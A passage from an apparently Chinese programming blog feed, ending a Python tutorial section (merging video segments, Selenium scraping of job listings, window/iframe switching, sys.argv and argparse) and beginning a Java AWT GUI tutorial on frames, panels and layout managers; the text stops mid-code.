<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#6、将所有ts文件合并为一个mp4视频</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    os.system(<span class="string">f&#x27;copy /b e:\\python\\爬虫\\5、多线程\\video2\\* e:\\movie.mp4&#x27;</span>)<span class="comment">#将e:\\python\\爬虫\\5、多线程\\video2\\该目录下的所有视频合并为e盘下的movie.mp4</span></span><br></pre></td></tr></table></figure>

<h2 id="Selenium">1.7. Selenium</h2><h3 id="基础介绍-6">1.7.1. 基础介绍</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">优点：</span><br><span class="line">1、使用更加方便，不用处理信息解密步骤以及框架嵌套等</span><br><span class="line">selenium的缺点：</span><br><span class="line">1、如果网站加载过慢会报错，需要借助time.sleep()函数来延迟程序执行</span><br><span class="line">2、浏览器有受自动化测试工具控制的标识，有些网站会以此为标准做反爬</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">环境搭建</span><br><span class="line">1、下载浏览器驱动：http://chromedriver.storage.googleapis.com/index.html  对应的浏览器版本对不上就找最近的一个</span><br><span class="line">2、把解压缩的浏览器驱动放到python解释器下，pycharm右键运行，下面第一行有解释器所在目录</span><br></pre></td></tr></table></figure>

<h3 id="案例：抓取拉勾网职位信息">1.7.2. 案例：抓取拉勾网职位信息</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> Chrome</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">web = Chrome()<span class="comment">#1、创建浏览器对象</span></span><br><span class="line">web.get(<span class="string">&#x27;https://www.lagou.com/&#x27;</span>)<span class="comment">#2、打开浏览器</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">el = web.find_element(By.XPATH,<span class="string">&#x27;//*[@id=&quot;changeCityBox&quot;]/ul/li[1]/a&#x27;</span>)<span class="comment">#新语法，找到按钮的xpath</span></span><br><span class="line">el.click()<span class="comment">#鼠标单击事件</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">web.find_element(By.XPATH,<span class="string">&#x27;//*[@id=&quot;search_input&quot;]&#x27;</span>).send_keys(<span class="string">&quot;python&quot;</span>,Keys.ENTER)<span class="comment">#在文本框输入python并回车</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">jobs = web.find_elements(By.CLASS_NAME,<span class="string">&#x27;item__10RTO&#x27;</span>)<span class="comment">#检索类名为item__10RTO的块</span></span><br><span class="line"><span class="keyword">for</span> job <span class="keyword">in</span> jobs:</span><br><span class="line">    job_name = job.find_element(By.TAG_NAME,<span class="string">&#x27;a&#x27;</span>).text<span class="comment">#遍历工作名称</span></span><br><span class="line">    pay = job.find_element(By.CLASS_NAME,<span class="string">&#x27;money__3Lkgq&#x27;</span>).text<span class="comment">#遍历工作薪资</span></span><br><span class="line">    company = job.find_element(By.CLASS_NAME,<span class="string">&#x27;company-name__2-SjF&#x27;</span>).text<span class="comment">#遍历公司名称</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;岗位名称：<span class="subst">&#123;job_name&#125;</span>，工资为：<span class="subst">&#123;pay&#125;</span>，公司名称：<span class="subst">&#123;company&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="窗口切换">1.7.3. 窗口切换</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> Chrome</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">web = Chrome()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#窗口切换</span></span><br><span class="line">web.get(<span class="string">&#x27;https://www.lagou.com/&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">web.find_element(By.XPATH,<span class="string">&#x27;//*[@id=&quot;changeCityBox&quot;]/ul/li[3]/a&#x27;</span>).click()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">web.find_element(By.XPATH,<span class="string">&#x27;//*[@id=&quot;search_input&quot;]&#x27;</span>).send_keys(<span class="string">&#x27;python&#x27;</span>,Keys.ENTER)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">web.find_element(By.XPATH,<span class="string">&#x27;//*[@id=&quot;jobList&quot;]/div[1]/div[2]/div[1]/div[1]/div[1]/a&#x27;</span>).click()</span><br><span class="line"><span class="comment">#在selenium眼中，新窗口是不会切换过来的</span></span><br><span class="line">web.switch_to.window(web.window_handles[-<span class="number">1</span>])<span class="comment">#切换语句</span></span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">#iframe之间的切换</span></span><br><span class="line">web.get(<span class="string">&#x27;http://www.meijuwang.cc/w/zuozuomuyugongye-1-1.html&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">iframe = web.find_element(By.XPATH,<span class="string">&#x27;//*[@id=&quot;playleft&quot;]/iframe&#x27;</span>)<span class="comment">#获取iframe定位</span></span><br><span class="line">web.switch_to.frame(iframe)<span class="comment">#将窗口视角切换到iframe</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#web.switch_to.default_content()#切换回默认的主界面</span></span><br><span class="line">tx = web.find_element(By.XPATH,<span class="string">&#x27;//*[@id=&quot;mvideo&quot;]/div[6]/div[1]/a&#x27;</span>).text</span><br></pre></td></tr></table></figure>

<h2 id="处理命令行参数">1.8. 处理命令行参数</h2><h3 id="sys">1.8.1. sys</h3><h4 id="使用方法">1.8.1.1. 使用方法:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.sys.argv[n]	n&gt;=0</span><br></pre></td></tr></table></figure>

<h4 id="实例">1.8.1.2. 实例:</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="built_in">print</span>(sys.argv[<span class="number">0</span>])	<span class="comment">#	打印自身</span></span><br><span class="line"><span class="built_in">print</span>(sys.argv[<span class="number">1</span>])	<span class="comment">#	输出参数1</span></span><br><span class="line"><span class="built_in">print</span>(sys.argv[<span class="number">2</span>])	<span class="comment">#	输出参数2</span></span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line">PS D:\测试&gt;python3 .\test.py <span class="number">1</span> <span class="number">2</span></span><br><span class="line">.\test.py</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>

<h3 id="argparse">1.8.2. argparse</h3><h4 id="使用方法-1">1.8.2.1. 使用方法:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. import argparse # 导入模块</span><br><span class="line">2. parse = argparse.ArgumentParser() # 创建对象</span><br><span class="line">3. parse.add_argument() # 添加参数</span><br><span class="line"></span><br><span class="line">    # add_argument</span><br><span class="line">    #     name: 参数名称</span><br><span class="line">    #     narg:</span><br><span class="line">    #           “+” 代表至少一个参数</span><br><span class="line">    #           &quot;*&quot; 代表0个或所有</span><br><span class="line">    #           &quot;?&quot; 代表0个或至少一个参数</span><br><span class="line">    #     type: 参数类型</span><br><span class="line">    #           str 字符类型</span><br><span class="line">    #           int 整型</span><br><span class="line">    #           ...</span><br><span class="line">    #     default: 默认值</span><br><span class="line">    #     help: 显示帮助信息</span><br><span class="line">    #     dest: 后续对象调用参数的名称</span><br><span class="line">    </span><br><span class="line">4. parse.parse_args() # 解析参数</span><br></pre></td></tr></table></figure>

<h4 id="实例-1">1.8.2.2. 实例:</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    parse = argparse.ArgumentParser()   <span class="comment"># 创建ArgumentParser对象</span></span><br><span class="line">    </span><br><span class="line">    parse.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, nargs=<span class="string">&quot;?&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Set URL&quot;</span>, dest=<span class="string">&quot;url&quot;</span>)    <span class="comment"># 增加参数1</span></span><br><span class="line">    parse.add_argument(<span class="string">&quot;-o&quot;</span>, <span class="string">&quot;--output&quot;</span>, nargs=<span class="string">&quot;?&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Set output file&quot;</span>, dest=<span class="string">&quot;output&quot;</span>)    <span class="comment"># 增加参数2 ...</span></span><br><span class="line"></span><br><span class="line">    arg = parse.parse_args()  <span class="comment"># 解析参数</span></span><br><span class="line">    <span class="keyword">return</span> arg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parse = test()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;URL链接为:<span class="subst">&#123;parse.url&#125;</span>\n输出文件目录为:<span class="subst">&#123;parse.output&#125;</span>&quot;</span>)</span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line">PS E:\python&gt; python3 .\Argparse.py -u https://www.baidu.com -o C://desktop</span><br><span class="line">URL链接为:https://www.baidu.com</span><br><span class="line">输出文件目录为:C://desktop</span><br><span class="line">PS E:\python&gt;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>高级语言</category>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title>JavaGUI</title>
    <url>/pages/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80/Java/JavaGUI.html</url>
    <content><![CDATA[<h1 id="GUI编程">1. GUI编程</h1><h2 id="组件">1.1. 组件</h2><ul>
<li><p>窗口</p>
</li>
<li><p>弹窗</p>
</li>
<li><p>面板</p>
</li>
<li><p>控件</p>
</li>
<li><p>事件监听</p>
</li>
</ul>
<h2 id="1、简介">1.2. 1、简介</h2><p>GUI技术的核心 : Swing，AWT</p>
<p>缺点：</p>
<ol>
<li>界面不美观</li>
<li>需要jre环境</li>
</ol>
<p>为什么要学？</p>
<ol>
<li>写工具</li>
<li>了解MVC架构、了解监听</li>
</ol>
<h2 id="2、AWT">1.3. 2、AWT</h2><h3 id="2-1、Awt介绍">1.3.1. 2.1、Awt介绍</h3><ol>
<li><p>包含了很多类和接口！GUI!</p>
</li>
<li><p>元素：窗口，按钮，文本框…</p>
</li>
<li><p>java.awt</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111180902537.png" alt="image-20221111180902537"></p>
</li>
</ol>
<h3 id="2-2、组件和容器">1.3.2. 2.2、组件和容器</h3><h4 id="窗口Frame">1.3.2.1. 窗口Frame</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.GUI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建窗口，默认不可见</span></span><br><span class="line">        <span class="type">Frame</span> <span class="variable">frame</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Frame</span>(<span class="string">&quot;First GUI&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置窗口可见</span></span><br><span class="line">        frame.setVisible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 设置窗口大小</span></span><br><span class="line">        frame.setSize(<span class="number">500</span>,<span class="number">500</span>);</span><br><span class="line">        <span class="comment">// 窗口RGB    可有可无</span></span><br><span class="line">        frame.setBackground(<span class="keyword">new</span> <span class="title class_">Color</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>));</span><br><span class="line">        <span class="comment">// 设置窗口初始位置</span></span><br><span class="line">        frame.setLocation(<span class="number">640</span>,<span class="number">360</span>);</span><br><span class="line">        <span class="comment">// 设置窗口大小不可变,默认为true</span></span><br><span class="line">        frame.setResizable(<span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111182143746.png" alt="image-20221111182143746"></p>
<ul>
<li><input disabled type="checkbox"> 将上面代码封装到类中</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.GUI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Frame</span>(<span class="number">100</span>,<span class="number">100</span>,<span class="number">300</span>,<span class="number">300</span>,Color.white);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Frame</span>(<span class="number">400</span>,<span class="number">400</span>,<span class="number">300</span>,<span class="number">300</span>,Color.black);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承java.awt.Frame类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Frame</span> <span class="keyword">extends</span> <span class="title class_">java</span>.awt.Frame &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 构造方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Frame</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y,<span class="type">int</span> w,<span class="type">int</span> h,Color color)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="string">&quot;First GUI&quot;</span> + ++id);</span><br><span class="line">        setVisible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 设置位置及大小</span></span><br><span class="line">        setBounds(x,y,w,h);</span><br><span class="line">        setBackground(color);</span><br><span class="line">        setResizable(<span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111190315306.png" alt="image-20221111190315306"></p>
<h4 id="面板Panel">1.3.2.2. 面板Panel</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.GUI;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.WindowAdapter;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.WindowEvent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Frame</span> <span class="variable">frame</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Frame</span>(<span class="string">&quot;Second GUI&quot;</span>);</span><br><span class="line">        frame.setBounds(<span class="number">200</span>,<span class="number">200</span>,<span class="number">400</span>,<span class="number">400</span>);</span><br><span class="line">        frame.setBackground(<span class="keyword">new</span> <span class="title class_">Color</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>));</span><br><span class="line">        frame.setResizable(<span class="literal">false</span>);</span><br><span class="line">        <span class="comment">// 设置流布局为null，不加的话，panel默认会铺满frame</span></span><br><span class="line">        frame.setLayout(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Panel</span> <span class="variable">panel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Panel</span>();</span><br><span class="line">        <span class="comment">// panel一定要设置大小，不然不会生效</span></span><br><span class="line">        panel.setBounds(<span class="number">100</span>,<span class="number">100</span>,<span class="number">100</span>,<span class="number">100</span>);</span><br><span class="line">        panel.setBackground(Color.black);</span><br><span class="line">        <span class="comment">// 将panel加入frame</span></span><br><span class="line">        frame.add(panel);</span><br><span class="line">        frame.setVisible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// addWindowListener创建监听，去实现WindowAdapter中windowClosing事件</span></span><br><span class="line">        frame.addWindowListener(<span class="keyword">new</span> <span class="title class_">WindowAdapter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">windowClosing</span><span class="params">(WindowEvent e)</span> &#123;</span><br><span class="line">                <span class="comment">// 点关闭退出程序</span></span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111195035835.png" alt="image-20221111195035835"></p>
<h3 id="2-3、布局管理器">1.3.3. 2.3、布局管理器</h3><ul>
<li>流式布局</li>
<li>东西南北中</li>
<li>表格布局</li>
</ul>
<h4 id="流式布局">1.3.3.1. 流式布局</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> GUI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Frame</span> <span class="variable">frame</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Frame</span>();</span><br><span class="line">        <span class="comment">// 组件-按钮</span></span><br><span class="line">        <span class="type">Button</span> <span class="variable">button1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;button1&quot;</span>);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;button2&quot;</span>);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;button3&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置为流式布局,按钮的默认对齐方式，默认为Center</span></span><br><span class="line">        frame.setLayout(<span class="keyword">new</span> <span class="title class_">FlowLayout</span>(FlowLayout.LEFT));</span><br><span class="line"></span><br><span class="line">        button1.setVisible(<span class="literal">true</span>);</span><br><span class="line">        button2.setVisible(<span class="literal">true</span>);</span><br><span class="line">        button3.setVisible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        frame.setVisible(<span class="literal">true</span>);</span><br><span class="line">        frame.setSize(<span class="number">400</span>,<span class="number">400</span>);</span><br><span class="line">        frame.add(button1);</span><br><span class="line">        frame.add(button2);</span><br><span class="line">        frame.add(button3);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220903203006439.png" alt="image-20220903203006439"></p>
<h4 id="东西南北中">1.3.3.2. 东西南北中</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.GUI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.WindowAdapter;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.WindowEvent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo04</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Frame</span> <span class="variable">frame</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Frame</span>();</span><br><span class="line">        Button east= <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;east&quot;</span>);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">west</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;west&quot;</span>);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">south</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;south&quot;</span>);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">north</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;north&quot;</span>);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">center</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;center&quot;</span>);</span><br><span class="line"></span><br><span class="line">        frame.add(east,BorderLayout.EAST);</span><br><span class="line">        frame.add(west,BorderLayout.WEST);</span><br><span class="line">        frame.add(south,BorderLayout.SOUTH);</span><br><span class="line">        frame.add(north,BorderLayout.NORTH);</span><br><span class="line">        frame.add(center,BorderLayout.CENTER);</span><br><span class="line"></span><br><span class="line">        frame.setVisible(<span class="literal">true</span>);</span><br><span class="line">        frame.setSize(<span class="number">400</span>,<span class="number">400</span>);</span><br><span class="line"></span><br><span class="line">        frame.addWindowListener(<span class="keyword">new</span> <span class="title class_">WindowAdapter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">windowClosing</span><span class="params">(WindowEvent e)</span> &#123;</span><br><span class="line">                <span class="comment">// 点关闭退出程序</span></span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220903202748857.png" alt="image-20220903202748857"></p>
<h4 id="表格布局">1.3.3.3. 表格布局</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.GUI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.WindowAdapter;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.WindowEvent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo05</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Frame</span> <span class="variable">frame</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Frame</span>(<span class="string">&quot;This is Demo04&quot;</span>);</span><br><span class="line">        frame.setBounds(<span class="number">500</span>,<span class="number">500</span>,<span class="number">300</span>,<span class="number">300</span>);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;button1&quot;</span>);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;button2&quot;</span>);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;button3&quot;</span>);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;button4&quot;</span>);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;button5&quot;</span>);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;button6&quot;</span>);</span><br><span class="line">		<span class="comment">// 几行几列，左右间距、上下间距</span></span><br><span class="line">        frame.setLayout(<span class="keyword">new</span> <span class="title class_">GridLayout</span>(<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        frame.add(button1);</span><br><span class="line">        frame.add(button2);</span><br><span class="line">        frame.add(button3);</span><br><span class="line">        frame.add(button4);</span><br><span class="line">        frame.add(button5);</span><br><span class="line">        frame.add(button6);</span><br><span class="line">        frame.setVisible(<span class="literal">true</span>);</span><br><span class="line">        frame.pack(); <span class="comment">// 自动设置大小</span></span><br><span class="line"></span><br><span class="line">        frame.addWindowListener(<span class="keyword">new</span> <span class="title class_">WindowAdapter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">windowClosing</span><span class="params">(WindowEvent e)</span> &#123;</span><br><span class="line">                <span class="comment">// 点关闭退出程序</span></span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111202659331.png" alt="image-20221111202659331"></p>
<h4 id="测试小结">1.3.3.4. 测试小结</h4><p>制作如下图图形</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220904132141584.png" alt="image-20220904132141584"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> GUI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 总Frame</span></span><br><span class="line">        <span class="type">Frame</span> <span class="variable">frame</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Frame</span>();</span><br><span class="line">        frame.setLayout(<span class="keyword">new</span> <span class="title class_">GridLayout</span>(<span class="number">2</span>,<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4个面板</span></span><br><span class="line">        <span class="type">Panel</span> <span class="variable">panel1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Panel</span>(<span class="keyword">new</span> <span class="title class_">BorderLayout</span>());</span><br><span class="line">        <span class="type">Panel</span> <span class="variable">panel2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Panel</span>(<span class="keyword">new</span> <span class="title class_">GridLayout</span>(<span class="number">2</span>,<span class="number">1</span>));</span><br><span class="line">        <span class="type">Panel</span> <span class="variable">panel3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Panel</span>(<span class="keyword">new</span> <span class="title class_">BorderLayout</span>());</span><br><span class="line">        <span class="type">Panel</span> <span class="variable">panel4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Panel</span>(<span class="keyword">new</span> <span class="title class_">GridLayout</span>(<span class="number">2</span>,<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        panel1.setVisible(<span class="literal">true</span>);</span><br><span class="line">        panel1.setBackground(<span class="keyword">new</span> <span class="title class_">Color</span>(<span class="number">145</span>, <span class="number">121</span>, <span class="number">121</span>));</span><br><span class="line">        panel2.setBounds(<span class="number">50</span>,<span class="number">0</span>,<span class="number">300</span>,<span class="number">100</span>);</span><br><span class="line">        panel2.setVisible(<span class="literal">true</span>);</span><br><span class="line">        panel2.setBackground(<span class="keyword">new</span> <span class="title class_">Color</span>(<span class="number">115</span>, <span class="number">60</span>, <span class="number">60</span>));</span><br><span class="line">        panel3.setVisible(<span class="literal">true</span>);</span><br><span class="line">        panel3.setBackground(<span class="keyword">new</span> <span class="title class_">Color</span>(<span class="number">86</span>, <span class="number">73</span>, <span class="number">73</span>));</span><br><span class="line">        panel4.setBounds(<span class="number">50</span>,<span class="number">100</span>,<span class="number">300</span>,<span class="number">100</span>);</span><br><span class="line">        panel4.setVisible(<span class="literal">true</span>);</span><br><span class="line">        panel4.setBackground(<span class="keyword">new</span> <span class="title class_">Color</span>(<span class="number">19</span>, <span class="number">8</span>, <span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 